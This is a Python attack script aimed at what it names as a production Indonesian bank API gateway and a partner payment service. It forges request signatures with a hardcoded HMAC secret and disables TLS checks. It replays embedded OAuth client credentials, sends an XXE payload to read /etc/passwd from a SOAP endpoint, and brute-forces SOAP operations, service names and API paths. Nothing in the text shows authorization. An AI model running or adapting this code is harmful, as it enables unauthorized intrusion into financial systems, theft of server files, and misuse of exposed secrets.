#!/usr/bin/env python3
import hmac, hashlib, json, datetime, urllib.request, ssl

SECRET = "XO8V9VcN08JpAw9QXBpYUlQFmxILm4Cb"
ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE

def forge(method, path, body=""):
    now = datetime.datetime.now(datetime.timezone.utc)
    ts = now.strftime('%Y-%m-%dT%H:%M:%S.') + f"{now.microsecond//1000:03d}" + 'Z'
    body_str = "" if body == "" else json.dumps(body)
    h = hashlib.sha256(body_str.encode()).hexdigest()
    msg = f"{method}:{path}:{h}:{ts}"
    sig = hmac.new(SECRET.encode(), msg.encode(), hashlib.sha256).hexdigest()
    return {"X-SIGNATURE": sig, "X-TIMESTAMP": ts, "X-PLATFORM": "WEBVIEW", "X-PARTNER-ID": "payuung"}

def req(method, url, headers):
    r = urllib.request.Request(url, method=method, headers=headers)
    try:
        resp = urllib.request.urlopen(r, timeout=20, context=ctx)
        return resp.status, resp.read()[:400].decode('utf-8', 'ignore')
    except urllib.error.HTTPError as e:
        return e.code, e.read()[:400].decode('utf-8', 'ignore')
    except Exception as e:
        return "ERR", str(e)[:120]

print("== EGRESS IP ==")
try:
    print(urllib.request.urlopen("https://api.ipify.org", timeout=10, context=ctx).read().decode())
except Exception as e:
    print("ipify err", e)

targets = [
    ("https://apigw-prod.bankina.id/exp-api-cicilan/1.0/", "/exp-api-cicilan/1.0/"),
    ("https://apigw-prod.bankina.id/exp-api-cicilan/1.0/cicilan/dashboard", "/exp-api-cicilan/1.0/cicilan/dashboard"),
    ("https://apigw-prod.bankina.id/exp-api-portal-loan/1.0/loan/partner/config", "/exp-api-portal-loan/1.0/loan/partner/config"),
    ("https://apigw-prod.bankina.id/exp-api-portal-loan/1.0/", "/exp-api-portal-loan/1.0/"),
]
for url, path in targets:
    s, b = req("GET", url, {"User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)", **forge("GET", path)})
    print(f"{s} {path} => {b[:200]}")

print("== PAYUUNG API RETEST (client_credentials) ==")
try:
    data = json.dumps({"client_id":"jgHY8WqE1gZwqEifL9axo9Zo4cik9PDT9DyQy80JdZQ=","client_secret":"ySjvffjjAPkB6EvKv6BTZ7Pwq2sV/R8h/V9HD4MFE4M=","grant_type":"client_credentials"}).encode()
    r = urllib.request.Request("https://api.payuung.com/v2/oauth2/token", data=data, headers={"Content-Type":"application/json"}, method="POST")
    resp = urllib.request.urlopen(r, timeout=20, context=ctx)
    print("payuung token:", resp.status, resp.read()[:150].decode())
except urllib.error.HTTPError as e:
    print("payuung token:", e.code, e.read()[:150].decode())
except Exception as e:
    print("payuung token ERR:", str(e)[:100])



print("== V10: SOAP DISCOVERY + XXE ==")
def soap_post(host, service, body, ctype="text/xml;charset=UTF-8"):
    r = urllib.request.Request("https://" + host + "/services/" + service, data=body.encode(), method="POST",
        headers={"Content-Type": ctype, "SOAPAction": "\"\"", "User-Agent": "Mozilla/5.0"})
    try:
        resp = urllib.request.urlopen(r, timeout=30, context=ctx)
        return resp.status, resp.read()[:600].decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read()[:600].decode("utf-8", "ignore")
    except Exception as e:
        return "ERR", str(e)[:120]

ENV = '<?xml version="1.0"?><soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Body>{}</soapenv:Body></soapenv:Envelope>'

# 1. generic body → fault reveals expected op
s, b = soap_post("apigw-prod.bankina.id", "WorkflowCallbackService", ENV.format("<test/>"))
print("WFC generic:", s, b[:400])

# 2. echo service
s, b = soap_post("apigw-prod.bankina.id", "echo", ENV.format("<echoString><in>hello</in></echoString>"))
print("ECHO:", s, b[:300])

# 3. XXE test di WorkflowCallbackService
XXE = '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Body><test>&xxe;</test></soapenv:Body></soapenv:Envelope>'
s, b = soap_post("apigw-prod.bankina.id", "WorkflowCallbackService", XXE)
print("XXE WFC:", s, b[:400])

# 4. common op guessing
for op in ["process", "callback", "notify", "handleResponse", "onEvent", "update", "complete", "receive", "submit"]:
    s, b = soap_post("apigw-prod.bankina.id", "WorkflowCallbackService", ENV.format("<" + op + "/>"))
    print("OP " + op + " => " + str(s) + " " + b[:120])

# 5. service name guessing
for svc in ["LoanService", "CicilanService", "WorkflowService", "CallbackService", "BinaService", "OnboardingService", "MasterDataService"]:
    s, b = req("GET", "https://apigw-prod.bankina.id/services/" + svc, {"User-Agent": "Mozilla/5.0"})
    print("SVC " + svc + " => " + str(s) + " " + b[:60])
print("== V13: SWEEP NAMA exp-api ==")
names = ["exp-api-auth","exp-api-user","exp-api-users","exp-api-onboarding","exp-api-loan","exp-api-master","exp-api-bina","exp-api-cicilan","exp-api-portal-loan","exp-api-portal","exp-api-savings","exp-api-deposit","exp-api-account","exp-api-transfer","exp-api-payment","exp-api-qris","exp-api-partner","exp-api-webview","exp-api-customer","exp-api-kyc","exp-api-eform","exp-api-digital","exp-api-bankina","exp-api-ina","exp-api-bni","exp-api-callback","exp-api-workflow","exp-api-mall","exp-api-financing","exp-api-syariah"]
import time
for n in names:
    path = "/" + n + "/1.0/"
    h = forge("GET", path)
    s, b = req("GET", "https://apigw-prod.bankina.id" + path, {"User-Agent":"Mozilla/5.0", **h})
    if "700700" in b:
        print("BLOCKED " + n)
    elif s == 404:
        print("404      " + n)
    else:
        print(">>> " + str(s) + " " + n + " => " + b[:120])
    time.sleep(0.3)
